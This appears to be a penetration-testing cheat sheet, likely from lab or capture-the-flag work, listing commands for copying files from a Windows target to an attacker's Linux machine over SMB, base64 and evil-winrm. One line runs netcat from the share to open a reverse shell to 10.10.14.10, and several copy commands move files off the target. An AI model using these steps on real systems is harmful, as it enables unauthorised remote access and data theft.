---
title: "File Transfer (Windows To Linux)"
date: 2024-6-26
tags: ["file transfer", "Windows", "smb", "evil-winrm"]
---

---
### SMB

#### Start a Local SMB Server

```bash
impacket-smbserver share . -smb2support
```

#### cmd

```powershell
# Connect to SMB server without creds
net use \\10.10.14.10\share
```

```powershell
# Connect to SMB server with creds
net use \\10.10.14.10\share /u:<USER> <PASSWORD>
```

```powershell
# From target Windows to local Linux
copy example.txt \\10.10.14.10\share
```

```powershell
# From local Linux to target Windows
copy \\10.10.14.10\share\example.txt example.txt
```

```powershell
# Delete file
del example.txt
```

```powershell
# Remove SMB share
net use /d \\10.10.14.10\share
```

```powershell
# Older Windows (e.g. xp), use directly
\\10.10.14.10\share\nc.exe -e cmd.exe 10.10.14.10 443
```

<br>

---

### Base64 Encoding (for small binary)

```powershell
# In target Windows
[System.convert]::ToBase64String((Get-Content -Path 'C:\ProgramData\example.exe' -Encoding Byte))
```

```bash
# Copy and paste the base64 encoded binary to local Linux
echo -n '<BASE64_BINARY>' | base64 -d > example.exe
```

<small>*Note: For restricted environment*</small>

---

### Evil-winrm

```bash
# Evil-winrm built-in function
download "C:\ProgramData\example.txt" "/tmp/example.txt"
```

<br>